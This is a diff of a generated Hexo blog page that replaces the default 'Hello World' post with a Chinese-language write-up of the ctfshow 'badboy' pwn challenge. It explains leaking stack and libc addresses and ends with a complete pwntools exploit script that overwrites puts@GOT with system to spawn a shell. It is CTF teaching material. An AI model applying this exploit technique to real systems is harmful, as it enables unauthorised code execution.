@@ -19,21 +19,24 @@
   <meta name="author" content="xyyr">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+    <meta name="description" content="ctfshow元旦水友赛-badboy好久没打了，有人提到了，就看一看。 开了canary和nx保护，原本想着泄露canary，结果找不到泄露的方向。 kl点进去可以看到是6  可以循环两次，第一次泄露6个字节，第二次泄露3个字节。第一次泄露libc,第二次泄露栈。  地址分别相差0x18(24)和0x38(56)，fd8-eb0&#x3D;0x128(296) libc.sym查询不到__lib">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="https://xyyr-c.github.io/2024/10/22/hello-world/index.html">
+<meta property="og:title" content="xyyr">
+<meta property="og:url" content="https://xyyr-c.github.io/2024/10/23/ctfshow%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B-badboy/index.html">
 <meta property="og:site_name" content="xyyr">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="ctfshow元旦水友赛-badboy好久没打了，有人提到了，就看一看。 开了canary和nx保护，原本想着泄露canary，结果找不到泄露的方向。 kl点进去可以看到是6  可以循环两次，第一次泄露6个字节，第二次泄露3个字节。第一次泄露libc,第二次泄露栈。  地址分别相差0x18(24)和0x38(56)，fd8-eb0&#x3D;0x128(296) libc.sym查询不到__lib">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-10-22T02:53:43.761Z">
-<meta property="article:modified_time" content="2024-10-22T02:53:43.761Z">
+<meta property="og:image" content="d:\%E5%88%B7%E9%A2%98wp\picture\image-20240225185144632-17088626220521-17088626249693.png">
+<meta property="og:image" content="d:\%E5%88%B7%E9%A2%98wp\picture\image-20240225185750638.png">
+<meta property="article:published_time" content="2024-10-23T08:59:53.710Z">
+<meta property="article:modified_time" content="2024-02-25T12:06:45.978Z">
 <meta property="article:author" content="xyyr">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="d:\%E5%88%B7%E9%A2%98wp\picture\image-20240225185144632-17088626220521-17088626249693.png">
   
   
   
-  <title>Hello World - xyyr</title>
+  <title>xyyr</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -216,7 +219,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Hello World"></span>
+            <span id="subtitle" data-typed-text=""></span>
           
         </div>
 
@@ -227,8 +230,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-10-22 10:53" pubdate>
-          2024年10月22日 上午
+        <time datetime="2024-10-23 16:59" pubdate>
+          2024年10月23日 下午
         </time>
       </span>
     
@@ -239,7 +242,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          18 字
+          423 字
         
       </span>
     
@@ -250,7 +253,7 @@
         
         
         
-          1 分钟
+          4 分钟
         
       </span>
     
@@ -287,24 +290,33 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Hello World</h1>
+            <h1 id="seo-header"></h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2024年2月25日 晚上
+                  
+                
+              </p>
             
             
               <div class="markdown-body">
                 
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
+                <h4 id="ctfshow元旦水友赛-badboy"><a href="#ctfshow元旦水友赛-badboy" class="headerlink" title="ctfshow元旦水友赛-badboy"></a>ctfshow元旦水友赛-badboy</h4><p>好久没打了，有人提到了，就看一看。</p>
+<p>开了canary和nx保护，原本想着泄露canary，结果找不到泄露的方向。</p>
+<p>kl点进去可以看到是6</p>
+<p><img src="D:\刷题wp\picture\image-20240225185144632-17088626220521-17088626249693.png" srcset="/img/loading.gif" lazyload alt="image-20240225185144632"></p>
+<p>可以循环两次，第一次泄露6个字节，第二次泄露3个字节。第一次泄露libc,第二次泄露栈。</p>
+<p><img src="D:\刷题wp\picture\image-20240225185750638.png" srcset="/img/loading.gif" lazyload alt="image-20240225185750638"></p>
+<p>地址分别相差0x18(24)和0x38(56)，fd8-eb0&#x3D;0x128(296)</p>
+<p>libc.sym查询不到__libc_start_call_main这个名字，直接手动查找相减找了偏移为0x1110+0x26000</p>
+<p>(至于为什么又加了一个，因为手动vmmap看libc载入地址的时候看错地方了，第一个才是载入地址，这里看成了第二个，所以多减了一次。)</p>
+<p>6个字节足够泄露一个完整的地址，而三个字节不可以，由于需要将buf地址改为put_got的地址，所以一定要知道栈的地址，而3个字节已经足够libc的偏移地址。</p>
+<p>另：如果用远程打可以试着泄露下面的__libc_start_main,本地打通了，懒得再去打远程了。</p>
+<p>exp：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br>context(<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br><span class="hljs-attribute">p</span>=process(&#x27;./BadBoy-2&#x27;)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./BadBoy-2&#x27;)<br><span class="hljs-attribute">libc</span>=elf.libc<br><span class="hljs-comment">#p=remote(&#x27;&#x27;,)</span><br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def <span class="hljs-built_in">debug</span>():<br>    gdb.attach(p)<br>    pause(1)<br>puts_got = 0x601018<br><span class="hljs-comment">#debug()</span><br><br>sl(b<span class="hljs-string">&#x27;56&#x27;</span>)<br>stack_addr = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>))-0x128<br><span class="hljs-built_in">print</span>(hex(stack_addr))<br><br>sl(b<span class="hljs-string">&#x27;24&#x27;</span>)<br>rl()<br><span class="hljs-comment">#print(rl())</span><br><span class="hljs-attribute">libc_addr</span>=u64(rc(3).ljust(8,b&#x27;\x00&#x27;))<br><span class="hljs-built_in">print</span>(hex(libc_addr))<br>libc_addr = libc_addr-122-0x1110-0x26000<br><span class="hljs-built_in">print</span>(hex(libc_addr))<br>system_addr = libc_addr+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(hex(system_addr))<br><br><span class="hljs-attribute">offset</span>=puts_got-stack_addr<br>ru(<span class="hljs-string">&#x27;girl&#x27;</span>)<br><br>sd(<span class="hljs-string">&#x27;sh\x00&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;me?&#x27;</span>)<br><span class="hljs-built_in">debug</span>()<br>sl(str(offset))<br><br>sd(p32(system_addr))<br>p.interactive()<br>~                   <br></code></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 
                 
               </div>
@@ -322,8 +334,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Hello World</div>
-      <div>https://xyyr-c.github.io/2024/10/22/hello-world/</div>
+      <div></div>
+      <div>https://xyyr-c.github.io/2024/10/23/ctfshow元旦水友赛-badboy/</div>
     </div>
     <div class="license-meta">
       
@@ -335,7 +347,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年10月22日</div>
+          <div>2024年10月23日</div>
         </div>
       
       
@@ -367,15 +379,21 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/10/23/%E5%88%9D%E5%AD%A6%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/" title="初学安卓逆向（课是关卡+1）">
+                      <a href="/2024/10/23/GuestBooK--pwn/" title="">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">初学安卓逆向（课是关卡+1）</span>
+                        <span class="hidden-mobile"></span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2024/10/23/%E4%B8%80%E9%81%93%E5%9F%BA%E7%A1%80%E7%9A%84uaf%E7%9A%84%E4%B8%A4%E7%A7%8D%E9%A3%9F%E7%94%A8%E6%96%B9%E6%B3%95double%20free/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
